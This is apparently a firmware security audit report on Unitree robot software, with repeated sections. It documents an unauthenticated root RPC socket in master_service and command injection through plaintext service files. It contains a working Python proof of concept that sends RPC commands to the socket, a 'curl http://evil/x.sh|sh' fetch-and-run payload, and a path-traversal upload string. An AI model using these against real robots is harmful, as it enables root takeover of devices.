# Finding: AUD-msvc-unauth-rpc-socket

## Primitive
Auth / Access Control Bypass (unauthenticated privileged IPC RPC → root command execution of file-backed Cmd strings)

## Severity
CRITICAL (as the terminal endpoint of the confirmed remote chains; standalone local severity HIGH)

## Condition Analysis

### Summary
`master_service` — the root supervisor that executes every service's Start/Stop/Status `Cmd` string through a shell (it imports `system()`, module/master_service/master_service dynsym) — exposes a protobuf RPC server on the UNIX socket `/unitree/var/run/master_service.sock` (decrypted `master_service.json`, audit/decrypted/etc/master_service.json: `"SocketFileName": "/unitree/var/run/master_service.sock", "ThreadNumber": 5, "QueueLength": 10`). The wire protocol is the shared Unitree SDK2 `unitree::net::RPCServerBase` framework: a 16-byte header of `"ussp"` magic + 12-byte ASCII decimal length, followed by a serialized `unitree.RPCRequest{name, parameter}` protobuf (protocol verified by my own disassembly of the identical statically-linked framework in ota_boxed: `RPCServerBase::RecvRequest` ota_boxed@0x3ea7a4 reads 16 bytes, compares bytes 0-3 against the constant at ota_boxed .rodata 0x6782F8 = `"ussp"`, parses the length with `StringTo<long>` from header bytes 4-15, reads that many bytes, then `ParseFromString`; `RPCServerBase::ServiceContexFunction` ota_boxed@0x3ea518 then calls the registered `std::function` handler directly with **no peer-identity check whatsoever** — no SO_PEERCRED, no token, no uid check anywhere in the path). The shipped runtime log (var/log/master_service/master_service.LOG) proves the live handler table: 12 handlers registered — `ExecuteCmd, GetCmdState, GetServiceEnable, GetServiceState, ListCmdState, ListServiceState, ReloadService, RemoveCmd, RemoveService, RestartService, StartService, StopService`. Any process that can `connect()` to the socket therefore controls the entire robot service lifecycle as root: `StartService(name)`/`RestartService(name)` execute the service's `Cmd` string from `etc/master_service/service/<name>` via `system()` as root; `ExecuteCmd(name)` executes any of the 12 root cmd scripts from `etc/master_service/cmd/`; `ReloadService(name)` re-reads a service JSON from disk (mscli usage text: "reload service if service config file is update"), arming a previously written file; `RemoveService`/`RemoveCmd` delete definitions. There is no authentication between the `accept()` and the handler dispatch.

### Pre-conditions
- master_service running (it is the boot supervisor — always running; log line 1: `MasterService Parse...`).
- Attacker can reach the socket: any local process (all robot services run as root, so local compromise already implies root — the socket matters as a *pivot/consolidation* primitive), OR
- **Network reachability without local code execution**: `robot_state_service` (TCP SDK2 server, grp-bin-009) bridges its network API to this socket: `RobotStateServer::SwitchService(name, enable)` @ robot_state_service 0x507104 → `SwitchServiceLocal` @ 0x50856c → `MSClient::StartService/StopService` → `master_service.sock` (unitree::robot::MSClient symbols in robot_state_service; master_service.sock string present in robot_state_service). A LAN peer that reaches robot_state's TCP RPC can start/stop any master_service service.
- Socket file permission: `UnixStreamSocket::Bind()` (robot_state_service 0x6ce9e8, same framework code master_service embeds) does `RemoveFile(path)` then plain `bind()` with **no `chmod()`** — the socket mode is `0777 & ~umask`, unverified at runtime (UNVERIFIED: master_service's launcher umask is outside the shipped overlay). If umask is permissive (0), every local uid can connect.

### Data Flow
1. Attacker (local process, or LAN peer via robot_state SwitchService bridge) sends `"ussp" + sprintf("%012d", len) + protobuf(RPCRequest{name:"RestartService", parameter:SimpleParameter{name:"<target>"}})` to `/unitree/var/run/master_service.sock`.
   Application: ServiceContexFunction dispatches by the protobuf `name` field to the registered handler (log: `registed handler. name:RestartService`).
2. `RPC_RestartService` → `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` (master_service symbols; shipped log shows the monitor performing exactly this: `stop service success. name:robot_state` → `start service success. name:robot_state`).
3. `ExecuteServiceStart` runs the `Cmd` string from `etc/master_service/service/<name>` through the shell as root (`system()` import; Cmd strings are full shell lines, e.g. service/bashrunner: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start ...`).
4. With any file-write primitive (OTA install per grp-bin-001: tar-slip into `/unitree/etc/master_service/service/`), the attacker writes a plaintext service JSON with `Cmd: "curl http://evil/x.sh|sh"`, then issues `ReloadService(name)` + `StartService(name)` — arbitrary root command execution. Note: service JSONs are PLAINTEXT (all 29 shipped files readable) — no FMX crypto needed for this pivot.

### Taint Trace
Source: socket bytes at /unitree/var/run/master_service.sock — type: local IPC (attacker-controlled after connect())
  ↓ Recv 16-byte header at RPCServerBase::RecvRequest (ota_boxed@0x3ea7a4; identical framework embedded in master_service, symbol `unitree::net::RPCServerBase::RecvRequest` in master_service symtab)
  ↓ Guard: 4-byte "ussp" magic compare at ota_boxed@0x3ea8dc (unitree::common::Compare, const @0x6782F8="ussp") — effective: NO (magic is public, not a credential)
  ↓ protobuf RPCRequest{name,parameter} parse (StringTo<long> length @0x3ea960; payload recv @0x3ea9f0)
  ↓ ServiceContexFunction → handler std::function call at ota_boxed@0x3ea5e0 — no auth layer
  → Sink: MasterService::RPC_ExecuteCmd / RPC_StartService / RPC_RestartService (master_service symtab; runtime registration proven by var/log/master_service/master_service.LOG "registed handler. name:ExecuteCmd" etc.) — EFFECT: EXEC (system()-executed root shell command from service/cmd file)

### Guard Assessment
| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | "ussp" magic | RPCServerBase::RecvRequest (shared framework) | 4-byte protocol tag | NO | Public constant, not a credential; anyone can prepend it |
| 2 | Socket file permissions | UnixStreamSocket::Bind (framework, robot_state 0x6ce9e8) | implicit connect() permission | UNVERIFIED | Bind performs no chmod; mode = 0777&~umask; launcher umask unknown; /unitree/var/run is 0777 in image |
| 3 | none | — | — | — | No SO_PEERCRED/uid/token check exists anywhere in RecvRequest/ServiceContexFunction (verified in real-code copies of the framework) |

### Impact
Full root control of the robot's service lifecycle: start/stop/restart/remove any of the 27 services (each start/stop is a root shell invocation of the file-backed Cmd string), execute any of the 12 root cmd scripts, delete service/cmd definitions (DoS), and — chained with any file-write primitive (OTA MQTT RCE per grp-bin-001, tar-slip into service/) — arbitrary root command execution. The socket is also the pivot that converts robot_state's network TCP API into root service control.

### Origin
- **Group**: grp-bin-003
- **Files**: module/master_service/master_service (symtab + decrypted config + shipped log), sbin/mscli (client contract), ota/engine/ota_boxed (real-code copy of shared framework), module/robot_state/robot_state_service (real-code copy + MSClient bridge)
- **Sink catalog reference**: audit/sinks/grp-bin-003-master-service.md

### Confidence
9 — protocol/no-auth verified by direct disassembly of the identical statically-linked framework in real-code binaries plus the shipped runtime log proving the live handler set; only runtime socket file permissions remain unverified (does not affect the network-bridge or OTA-chain reachability).

## Review: PASSED
- Taint trace verified: yes — I re-derived the full framing from my own disassembly of
  `RPCServerBase::RecvRequest` (ota_boxed@0x3ea7a4, with disasm): recv 16 bytes (BLR @0x3ea800
  with W3=0x10), `unitree::common::Compare(header,0,4,"ussp")` BL @0x3ea8dc against the const
  loaded at 0x3ea8b4 (`_ZN7unitree3netL24RPC_PROTOCOL_HEAD_PREFIXE` = "ussp"),
  `substr(4,-1)` → `unitree::common::StringTo<long>` BL @0x3ea960 (the 12-byte ASCII decimal
  length), payload recv BLR @0x3ea9f0, `google::protobuf::MessageLite::ParseFromString` BL
  @0x3eaa50 into `unitree::RPCRequest`. `ServiceContexFunction` (decompiled @0x3ea518) then
  calls the registered `std::function` at this+16 DIRECTLY — no SO_PEERCRED / getsockopt /
  uid / token check exists anywhere in either function.
- 12-handler list verified twice: runtime log `registed handler. name:...` (master_service.LOG:57-68,
  12 names) AND independently from the CLIENT side — mscli's usage block (strings, sbin/mscli)
  lists exactly 12 verbs: listservice/getservice/getenable/startservice/stopservice/
  restartservice/reloadservice/removeservice/listcmd/getcmd/removecmd/executecmd.
- Socket path verified from two independent artifacts: decrypted
  audit/decrypted/etc/master_service.json:6 (`"SocketFileName": "/unitree/var/run/master_service.sock"`,
  `"ThreadNumber": 5, "QueueLength": 10` — both match this finding) and the hardcoded default
  string `/unitree/var/run/master_service.sock` inside sbin/mscli itself, plus
  robot_state_service 0x894338 (string) referenced by `RobotStateServer::InitConfig`@0x501388
  (xrefs 0x5017f8/0x5017fc) — the bridge side knows the same path.
- Constraints verified: `UnixStreamSocket::Bind` re-derived at robot_state_service@0x6ce9e8 —
  it is `FileSystemHelper::RemoveFile(path)` then `SocketHelper::Bind`@0x6cfb0c (a bare
  `bind()` + error throw), NO chmod; and neither robot_state_service nor ota_boxed contains
  any caller of `umask` (xrefs to the umask PLT stubs: none). master_service's own copies are
  Virbox trampolines (verified: `RPCServerBase::RecvRequest` symtab entry 0x21a1a0 and
  `LoadServiceAll`@0x2e2308 are `adrp x16,<exec-.bss>; br x16` stubs), so the pivot to
  non-virtualized twins was sound and the framework symbols ARE present in master_service's
  symtab (RecvRequest@0x21a1a0, SendResponse@0x2ea900, ServiceContexFunction@0x588838).

### The exact wire protocol (re-derived for this PoC from the shipped client, `sbin/mscli`)

`unitree::net::RPCClientBase::SendRequest` (`mscli@0x2cb118`, decompiled) does:

```c
snprintf(s, 0x11u, "%s%012ld", "ussp", len);   // 16-byte header: "ussp" + 12 ASCII decimal digits
send(fd, s, 16);                               // must send EXACTLY 16 bytes
send(fd, serialized_request, len);             // then the protobuf body
```

`RecvResponse` (`mscli@0x2cb44c`) mirrors it: `recv(16)` → `Compare(buf,0,4,"ussp")` →
`StringTo<long>(substr(4))` → `recv(len)` → `ParseFromString`. The server side is the same
framework (`RPCServerBase::RecvRequest`, ota_boxed@0x3ea7a4, statically identical), and
`ServiceContexFunction` (ota_boxed@0x3ea518) then calls the registered `std::function`
**directly — no SO_PEERCRED, no getsockopt, no uid, no token, anywhere in the path.**

The protobuf schema was recovered from the descriptor blob embedded in `sbin/mscli`
(`descriptor_table_rpc_5fservice_5fapi_5fbase_2eproto`, the serialized `FileDescriptorProto`
at file offset `0x4c64c2`; the `master_service.proto` descriptor is at `0x4c6194`):

```proto
// rpc_service_api_base.proto, package unitree, syntax proto3
message RPCRequest  { string name = 1; bytes parameter = 2; }
message RPCResponse { int32 code = 1; bytes data = 2; bytes message = 3; }

// master_service.proto, package unitree.ms
message SimpleParameter { string name = 101; }   // field 101, NOT 1
```

The `SimpleParameter.name` field number is the non-obvious part and was verified twice: from
the descriptor (`\x12\x0c\n\x04name\x18e \x01(\t`, i.e. FieldDescriptorProto.number = 0x65 =
101) and from the generated serializer — `SimpleParameter::_InternalSerialize` (`mscli@0x2b9fd0`)
calls `EpsCopyOutputStream::WriteStringMaybeAliased(a3, 101, ...)`. `RPCRequest`'s fields are
1 and 2 (`RPCRequest::_InternalSerialize`, `mscli@0x2b8f00`-area, calls `WriteStringMaybeAliased(…, 1, …)`
then `WriteBytesMaybeAliased(…, 2, …)`). `Mscli::ExecuteCmd` (`mscli@0x2b6b64`) shows the
reference construction: build `SimpleParameter{name=arg}`, `SerializeToString` it, stuff it
into `RPCRequest{name="ExecuteCmd", parameter=<those bytes>}`, then `RPCClientBase::Call`
with a 30 000 000 (µs) timeout.

#!/usr/bin/env python3
"""AUD-msvc-unauth-rpc-socket PoC — unauthenticated privileged RPC on
/unitree/var/run/master_service.sock. 16-byte 'ussp' header + unitree.RPCRequest protobuf;
the ONLY 'auth' is the public 4-byte magic.  Harmless target: ExecuteCmd(net-init),
a shipped cmd script whose decrypted Cmd string is a fixed shell line."""
import socket, sys

SOCK = sys.argv[1] if len(sys.argv) > 1 else "/unitree/var/run/master_service.sock"
VERB = sys.argv[2] if len(sys.argv) > 2 else "ExecuteCmd"
ARG  = sys.argv[3] if len(sys.argv) > 3 else "net-init"

def varint(n):
    out = b""
    while True:
        b, n = n & 0x7F, n >> 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out

def len_delim(field, payload):                 # proto3 length-delimited field
    return varint((field << 3) | 2) + varint(len(payload)) + payload

def simple_parameter(name):                    # unitree.ms.SimpleParameter{name = 101}
    return len_delim(101, name.encode())

def rpc_request(name, parameter=b""):          # unitree.RPCRequest{name = 1, parameter = 2}
    return len_delim(1, name.encode()) + (len_delim(2, parameter) if parameter else b"")

def read_varint(buf, i):
    val, shift = 0, 0
    while True:
        b = buf[i]; i += 1; val |= (b & 0x7F) << shift
        if not b & 0x80: return val, i
        shift += 7

def parse_msg(buf):                            # minimal response reader
    out, i = {}, 0
    while i < len(buf):
        f, i = read_varint(buf, i)
        field, wt = f >> 3, f & 7
        if wt == 0:
            v, i = read_varint(buf, i)
        elif wt == 2:
            n, i = read_varint(buf, i)
            v, i = buf[i:i + n], i + n
        else:
            break
        out[field] = v
    return out

def frame(body):                               # snprintf("%s%012ld", "ussp", len)
    return b"ussp" + b"%012d" % len(body) + body

body = rpc_request(VERB, simple_parameter(ARG))
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(30)                               # mscli uses 30000000 us
s.connect(SOCK)
s.sendall(frame(body))                         # header + protobuf in one shot
hdr = b""
while len(hdr) < 16:
    c = s.recv(16 - len(hdr))
    if not c: raise RuntimeError("closed before header")
    hdr += c
assert hdr[:4] == b"ussp", "bad magic %r" % hdr[:4]
n = int(hdr[4:16]); resp = b""
while len(resp) < n:
    c = s.recv(n - len(resp))
    if not c: break
    resp += c
s.close()
f = parse_msg(resp)
print("RPCRequest{name=%r, parameter=SimpleParameter{name=%r}}" % (VERB, ARG))
print("RPCResponse{code=%s, data=%d B, message=%r}"
      % (f.get(1, 0), len(f.get(2, b"")), f.get(3, b"")))
if f.get(2): print("  data:", f[2].decode(errors="replace")[:400])
```

160	### The exact wire protocol (re-derived for this PoC from the shipped client, `sbin/mscli`)
161	
162	`unitree::net::RPCClientBase::SendRequest` (`mscli@0x2cb118`, decompiled) does:
163	
164	```c
165	snprintf(s, 0x11u, "%s%012ld", "ussp", len);   // 16-byte header: "ussp" + 12 ASCII decimal digits
166	send(fd, s, 16);                               // must send EXACTLY 16 bytes
167	send(fd, serialized_request, len);             // then the protobuf body
168	```
169	
170	`RecvResponse` (`mscli@0x2cb44c`) mirrors it: `recv(16)` → `Compare(buf,0,4,"ussp")` →
171	`StringTo<long>(substr(4))` → `recv(len)` → `ParseFromString`. The server side is the same
172	framework (`RPCServerBase::RecvRequest`, ota_boxed@0x3ea7a4, statically identical), and
173	`ServiceContexFunction` (ota_boxed@0x3ea518) then calls the registered `std::function`
174	**directly — no SO_PEERCRED, no getsockopt, no uid, no token, anywhere in the path.**
175	
176	The protobuf schema was recovered from the descriptor blob embedded in `sbin/mscli`
177	(`descriptor_table_rpc_5fservice_5fapi_5fbase_2eproto`, the serialized `FileDescriptorProto`
178	at file offset `0x4c64c2`; the `master_service.proto` descriptor is at `0x4c6194`):
179	
180	```proto
181	// rpc_service_api_base.proto, package unitree, syntax proto3
182	message RPCRequest  { string name = 1; bytes parameter = 2; }
183	message RPCResponse { int32 code = 1; bytes data = 2; bytes message = 3; }
184	
185	// master_service.proto, package unitree.ms
186	message SimpleParameter { string name = 101; }   // field 101, NOT 1
187	```
188	
189	The `SimpleParameter.name` field number is the non-obvious part and was verified twice: from
190	the descriptor (`\x12\x0c\n\x04name\x18e \x01(\t`, i.e. FieldDescriptorProto.number = 0x65 =
191	101) and from the generated serializer — `SimpleParameter::_InternalSerialize` (`mscli@0x2b9fd0`)
192	calls `EpsCopyOutputStream::WriteStringMaybeAliased(a3, 101, ...)`. `RPCRequest`'s fields are
193	1 and 2 (`RPCRequest::_InternalSerialize`, `mscli@0x2b8f00`-area, calls `WriteStringMaybeAliased(…, 1, …)`
194	then `WriteBytesMaybeAliased(…, 2, …)`). `Mscli::ExecuteCmd` (`mscli@0x2b6b64`) shows the
195	reference construction: build `SimpleParameter{name=arg}`, `SerializeToString` it, stuff it
196	into `RPCRequest{name="ExecuteCmd", parameter=<those bytes>}`, then `RPCClientBase::Call`
197	with a 30 000 000 (µs) timeout.

222	```python
223	#!/usr/bin/env python3
224	"""AUD-msvc-unauth-rpc-socket PoC — unauthenticated privileged RPC on
225	/unitree/var/run/master_service.sock. 16-byte 'ussp' header + unitree.RPCRequest protobuf;
226	the ONLY 'auth' is the public 4-byte magic.  Harmless target: ExecuteCmd(net-init),
227	a shipped cmd script whose decrypted Cmd string is a fixed shell line."""
228	import socket, sys
229	
230	SOCK = sys.argv[1] if len(sys.argv) > 1 else "/unitree/var/run/master_service.sock"
231	VERB = sys.argv[2] if len(sys.argv) > 2 else "ExecuteCmd"
232	ARG  = sys.argv[3] if len(sys.argv) > 3 else "net-init"
233	
234	def varint(n):
235	    out = b""
236	    while True:
237	        b, n = n & 0x7F, n >> 7
238	        out += bytes([b | (0x80 if n else 0)])
239	        if not n:
240	            return out
241	
242	def len_delim(field, payload):                 # proto3 length-delimited field
243	    return varint((field << 3) | 2) + varint(len(payload)) + payload
244	
245	def simple_parameter(name):                    # unitree.ms.SimpleParameter{name = 101}
246	    return len_delim(101, name.encode())
247	
248	def rpc_request(name, parameter=b""):          # unitree.RPCRequest{name = 1, parameter = 2}
249	    return len_delim(1, name.encode()) + (len_delim(2, parameter) if parameter else b"")
250	
251	def read_varint(buf, i):
252	    val, shift = 0, 0
253	    while True:
254	        b = buf[i]; i += 1; val |= (b & 0x7F) << shift
255	        if not b & 0x80: return val, i
256	        shift += 7
257	
258	def parse_msg(buf):                            # minimal response reader
259	    out, i = {}, 0
260	    while i < len(buf):
261	        f, i = read_varint(buf, i)
262	        field, wt = f >> 3, f & 7
263	        if wt == 0:
264	            v, i = read_varint(buf, i)
265	        elif wt == 2:
266	            n, i = read_varint(buf, i)
267	            v, i = buf[i:i + n], i + n
268	        else:
269	            break
270	        out[field] = v
271	    return out
272	
273	def frame(body):                               # snprintf("%s%012ld", "ussp", len)
274	    return b"ussp" + b"%012d" % len(body) + body
275	
276	body = rpc_request(VERB, simple_parameter(ARG))
277	s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
278	s.settimeout(30)                               # mscli uses 30000000 us
279	s.connect(SOCK)
280	s.sendall(frame(body))                         # header + protobuf in one shot
281	hdr = b""
282	while len(hdr) < 16:
283	    c = s.recv(16 - len(hdr))
284	    if not c: raise RuntimeError("closed before header")
285	    hdr += c
286	assert hdr[:4] == b"ussp", "bad magic %r" % hdr[:4]
287	n = int(hdr[4:16]); resp = b""
288	while len(resp) < n:
289	    c = s.recv(n - len(resp))
290	    if not c: break
291	    resp += c
292	s.close()
293	f = parse_msg(resp)
294	print("RPCRequest{name=%r, parameter=SimpleParameter{name=%r}}" % (VERB, ARG))
295	print("RPCResponse{code=%s, data=%d B, message=%r}"
296	      % (f.get(1, 0), len(f.get(2, b"")), f.get(3, b"")))
297	if f.get(2): print("  data:", f[2].decode(errors="replace")[:400])
298	```

366	# Finding: AUD-msvc-service-cmd-file-rce
367	
368	## Primitive
369	Injection (root command injection via configuration file → `system()`) — the E19 pivot primitive
370	
371	## Severity
372	CRITICAL (as the terminal stage of the OTA chain; requires a file-write primitive as the entry)
373	
374	## Condition Analysis
375	
376	### Summary
377	Every service definition `/unitree/etc/master_service/service/<name>` is a PLAINTEXT JSON whose `Start/Stop/Status.Cmd` strings are executed through a shell **as root** by `master_service` (the binary imports `system()`; every shipped Cmd is a full shell line, e.g. `etc/master_service/service/bashrunner`: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start --background --make-pidfile ...`). Unlike `etc/master_service/cmd/*` (FMX-encrypted), service JSONs need **no cryptography to forge** — any file-write primitive into that directory is a root RCE. The reload semantics that arm the payload are confirmed: configs are loaded into memory at Init (`ChildExecutor::LoadServiceAll`, master_service symtab; log: `load child service config size:27`), and the `ReloadService` RPC re-reads a service's config file from disk when it changed (sbin/mscli usage string: `reloadservice [name] — reload service if service config file is update`), after which `StartService`/`RestartService` execute the new `Cmd` as root. Even without an RPC call, the 5-second child-service monitor (`ChildServiceMonitorInterval: 5000000` µs, decrypted master_service.json; shipped log shows `stop service success. name:robot_state` → `start service success. name:robot_state` cycles) continuously restarts services — using the in-memory Cmd, so the poisoned file fires on the next `ReloadService`, master_service restart, or reboot. This is the terminal stage of the grp-bin-001 confirmed fully-remote chain: ota_boxed MQTT command → `ota_module_utils` install (tar-slip, `libtar` extraction with no path normalization, scratchboard grp-bin-001) → file write into `/unitree/etc/master_service/service/` → root RCE.
378	
379	### Pre-conditions

767	### Strategy
768	
769	Three legs with one reboot in the middle. **Leg A** publishes the api-1006 knowledge
770	upload on `rt/api/gpt/request` with `uid = "../../../../etc/master_service/service/pwn"`
771	— **four** `../` segments (R13-corrected: `knowledge_dir_` =
772	`/unitree/robot/config/chat_go/knowledge` sits 4 levels below `/unitree`; `os.path.normpath`

774	at `/unitree/robot/etc/...`), and `content` = a complete plaintext service definition

783	`MSClient::StartService("pwn.md")` → master_service `system(Start.Cmd)` as root.

# Finding: AUD-msvc-unauth-rpc-socket

## Primitive
Auth / Access Control Bypass (unauthenticated privileged IPC RPC → root command execution of file-backed Cmd strings)

## Severity
CRITICAL (as the terminal endpoint of the confirmed remote chains; standalone local severity HIGH)

## Condition Analysis

### Summary
`master_service` — the root supervisor that executes every service's Start/Stop/Status `Cmd` string through a shell (it imports `system()`, module/master_service/master_service dynsym) — exposes a protobuf RPC server on the UNIX socket `/unitree/var/run/master_service.sock` (decrypted `master_service.json`, audit/decrypted/etc/master_service.json: `"SocketFileName": "/unitree/var/run/master_service.sock", "ThreadNumber": 5, "QueueLength": 10`). The wire protocol is the shared Unitree SDK2 `unitree::net::RPCServerBase` framework: a 16-byte header of `"ussp"` magic + 12-byte ASCII decimal length, followed by a serialized `unitree.RPCRequest{name, parameter}` protobuf (protocol verified by my own disassembly of the identical statically-linked framework in ota_boxed: `RPCServerBase::RecvRequest` ota_boxed@0x3ea7a4 reads 16 bytes, compares bytes 0-3 against the constant at ota_boxed .rodata 0x6782F8 = `"ussp"`, parses the length with `StringTo<long>` from header bytes 4-15, reads that many bytes, then `ParseFromString`; `RPCServerBase::ServiceContexFunction` ota_boxed@0x3ea518 then calls the registered `std::function` handler directly with **no peer-identity check whatsoever** — no SO_PEERCRED, no token, no uid check anywhere in the path). The shipped runtime log (var/log/master_service/master_service.LOG) proves the live handler table: 12 handlers registered — `ExecuteCmd, GetCmdState, GetServiceEnable, GetServiceState, ListCmdState, ListServiceState, ReloadService, RemoveCmd, RemoveService, RestartService, StartService, StopService`. Any process that can `connect()` to the socket therefore controls the entire robot service lifecycle as root: `StartService(name)`/`RestartService(name)` execute the service's `Cmd` string from `etc/master_service/service/<name>` via `system()` as root; `ExecuteCmd(name)` executes any of the 12 root cmd scripts from `etc/master_service/cmd/`; `ReloadService(name)` re-reads a service JSON from disk (mscli usage text: "reload service if service config file is update"), arming a previously written file; `RemoveService`/`RemoveCmd` delete definitions. There is no authentication between the `accept()` and the handler dispatch.

### Pre-conditions
- master_service running (it is the boot supervisor — always running; log line 1: `MasterService Parse...`).
- Attacker can reach the socket: any local process (all robot services run as root, so local compromise already implies root — the socket matters as a *pivot/consolidation* primitive), OR
- **Network reachability without local code execution**: `robot_state_service` (TCP SDK2 server, grp-bin-009) bridges its network API to this socket: `RobotStateServer::SwitchService(name, enable)` @ robot_state_service 0x507104 → `SwitchServiceLocal` @ 0x50856c → `MSClient::StartService/StopService` → `master_service.sock` (unitree::robot::MSClient symbols in robot_state_service; master_service.sock string present in robot_state_service). A LAN peer that reaches robot_state's TCP RPC can start/stop any master_service service.
- Socket file permission: `UnixStreamSocket::Bind()` (robot_state_service 0x6ce9e8, same framework code master_service embeds) does `RemoveFile(path)` then plain `bind()` with **no `chmod()`** — the socket mode is `0777 & ~umask`, unverified at runtime (UNVERIFIED: master_service's launcher umask is outside the shipped overlay). If umask is permissive (0), every local uid can connect.

### Data Flow
1. Attacker (local process, or LAN peer via robot_state SwitchService bridge) sends `"ussp" + sprintf("%012d", len) + protobuf(RPCRequest{name:"RestartService", parameter:SimpleParameter{name:"<target>"}})` to `/unitree/var/run/master_service.sock`.
   Application: ServiceContexFunction dispatches by the protobuf `name` field to the registered handler (log: `registed handler. name:RestartService`).
2. `RPC_RestartService` → `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` (master_service symbols; shipped log shows the monitor performing exactly this: `stop service success. name:robot_state` → `start service success. name:robot_state`).
3. `ExecuteServiceStart` runs the `Cmd` string from `etc/master_service/service/<name>` through the shell as root (`system()` import; Cmd strings are full shell lines, e.g. service/bashrunner: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start ...`).
4. With any file-write primitive (OTA install per grp-bin-001: tar-slip into `/unitree/etc/master_service/service/`), the attacker writes a plaintext service JSON with `Cmd: "curl http://evil/x.sh|sh"`, then issues `ReloadService(name)` + `StartService(name)` — arbitrary root command execution. Note: service JSONs are PLAINTEXT (all 29 shipped files readable) — no FMX crypto needed for this pivot.

### Taint Trace
Source: socket bytes at /unitree/var/run/master_service.sock — type: local IPC (attacker-controlled after connect())
  ↓ Recv 16-byte header at RPCServerBase::RecvRequest (ota_boxed@0x3ea7a4; identical framework embedded in master_service, symbol `unitree::net::RPCServerBase::RecvRequest` in master_service symtab)
  ↓ Guard: 4-byte "ussp" magic compare at ota_boxed@0x3ea8dc (unitree::common::Compare, const @0x6782F8="ussp") — effective: NO (magic is public, not a credential)
  ↓ protobuf RPCRequest{name,parameter} parse (StringTo<long> length @0x3ea960; payload recv @0x3ea9f0)
  ↓ ServiceContexFunction → handler std::function call at ota_boxed@0x3ea5e0 — no auth layer
  → Sink: MasterService::RPC_ExecuteCmd / RPC_StartService / RPC_RestartService (master_service symtab; runtime registration proven by var/log/master_service/master_service.LOG "registed handler. name:ExecuteCmd" etc.) — EFFECT: EXEC (system()-executed root shell command from service/cmd file)

### Guard Assessment
| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | "ussp" magic | RPCServerBase::RecvRequest (shared framework) | 4-byte protocol tag | NO | Public constant, not a credential; anyone can prepend it |
| 2 | Socket file permissions | UnixStreamSocket::Bind (framework, robot_state 0x6ce9e8) | implicit connect() permission | UNVERIFIED | Bind performs no chmod; mode = 0777&~umask; launcher umask unknown; /unitree/var/run is 0777 in image |
| 3 | none | — | — | — | No SO_PEERCRED/uid/token check exists anywhere in RecvRequest/ServiceContexFunction (verified in real-code copies of the framework) |

### Impact
Full root control of the robot's service lifecycle: start/stop/restart/remove any of the 27 services (each start/stop is a root shell invocation of the file-backed Cmd string), execute any of the 12 root cmd scripts, delete service/cmd definitions (DoS), and — chained with any file-write primitive (OTA MQTT RCE per grp-bin-001, tar-slip into service/) — arbitrary root command execution. The socket is also the pivot that converts robot_state's network TCP API into root service control.

### Origin
- **Group**: grp-bin-003
- **Files**: module/master_service/master_service (symtab + decrypted config + shipped log), sbin/mscli (client contract), ota/engine/ota_boxed (real-code copy of shared framework), module/robot_state/robot_state_service (real-code copy + MSClient bridge)
- **Sink catalog reference**: audit/sinks/grp-bin-003-master-service.md

### Confidence
9 — protocol/no-auth verified by direct disassembly of the identical statically-linked framework in real-code binaries plus the shipped runtime log proving the live handler set; only runtime socket file permissions remain unverified (does not affect the network-bridge or OTA-chain reachability).

## Review: PASSED
- Taint trace verified: yes — I re-derived the full framing from my own disassembly of
  `RPCServerBase::RecvRequest` (ota_boxed@0x3ea7a4, with disasm): recv 16 bytes (BLR @0x3ea800
  with W3=0x10), `unitree::common::Compare(header,0,4,"ussp")` BL @0x3ea8dc against the const
  loaded at 0x3ea8b4 (`_ZN7unitree3netL24RPC_PROTOCOL_HEAD_PREFIXE` = "ussp"),
  `substr(4,-1)` → `unitree::common::StringTo<long>` BL @0x3ea960 (the 12-byte ASCII decimal
  length), payload recv BLR @0x3ea9f0, `google::protobuf::MessageLite::ParseFromString` BL
  @0x3eaa50 into `unitree::RPCRequest`. `ServiceContexFunction` (decompiled @0x3ea518) then
  calls the registered `std::function` at this+16 DIRECTLY — no SO_PEERCRED / getsockopt /
  uid / token check exists anywhere in either function.
- 12-handler list verified twice: runtime log `registed handler. name:...` (master_service.LOG:57-68,
  12 names) AND independently from the CLIENT side — mscli's usage block (strings, sbin/mscli)
  lists exactly 12 verbs: listservice/getservice/getenable/startservice/stopservice/
  restartservice/reloadservice/removeservice/listcmd/getcmd/removecmd/executecmd.
- Socket path verified from two independent artifacts: decrypted
  audit/decrypted/etc/master_service.json:6 (`"SocketFileName": "/unitree/var/run/master_service.sock"`,
  `"ThreadNumber": 5, "QueueLength": 10` — both match this finding) and the hardcoded default
  string `/unitree/var/run/master_service.sock` inside sbin/mscli itself, plus
  robot_state_service 0x894338 (string) referenced by `RobotStateServer::InitConfig`@0x501388
  (xrefs 0x5017f8/0x5017fc) — the bridge side knows the same path.
- Constraints verified: `UnixStreamSocket::Bind` re-derived at robot_state_service@0x6ce9e8 —
  it is `FileSystemHelper::RemoveFile(path)` then `SocketHelper::Bind`@0x6cfb0c (a bare
  `bind()` + error throw), NO chmod; and neither robot_state_service nor ota_boxed contains
  any caller of `umask` (xrefs to the umask PLT stubs: none). master_service's own copies are
  Virbox trampolines (verified: `RPCServerBase::RecvRequest` symtab entry 0x21a1a0 and
  `LoadServiceAll`@0x2e2308 are `adrp x16,<exec-.bss>; br x16` stubs), so the pivot to
  non-virtualized twins was sound and the framework symbols ARE present in master_service's
  symtab (RecvRequest@0x21a1a0, SendResponse@0x2ea900, ServiceContexFunction@0x588838).
- Socket-mode guard 2: UPGRADed from UNVERIFIED to "likely 0777, still not runtime-proven".
  New empirical evidence: the shipped var/run contains 10 real pid files captured from the
  running robot (master_service.pid = "705" matches the last master_service instance PID 705,
  master_service.LOG:150579), ALL mode 0666. Nine of them are written by start-stop-daemon
  children spawned by master_service's own system() (per the service Cmd strings) — 0666 =
  0666&~umask ⇒ umask 0 in master_service's process tree ⇒ the bind()-created socket would be
  0777&~0 = 0777 (world-connectable by any local uid). Not conclusive: master_service also
  imports `chmod`, and its code is virtualized, so an explicit socket chmod cannot be excluded
  statically. Keep the local-vs-remote distinction as below.
